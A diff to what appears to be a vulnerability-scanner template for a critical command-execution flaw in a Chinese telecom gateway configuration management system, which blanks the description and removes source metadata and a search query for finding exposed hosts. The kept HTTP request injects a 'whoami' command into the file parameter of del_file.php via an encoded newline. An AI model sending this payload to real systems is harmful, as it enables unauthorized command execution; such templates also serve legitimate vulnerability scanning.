@@ -3,12 +3,8 @@ info:
   name: 电信网关配置管理系统-命令执行-del_file
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/yuisqo6ggu5wm7u4'
+  description: ''
   tags: rce,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: yuisqo6ggu5wm7u4
-    fofa: body="img/dl.gif" && title="系统登录"
 http:
 - raw:
   - 'GET /manager/newtpl/del_file.php?file=1.txt%0Awhoami%20>%20dudesite.txt HTTP/1.1
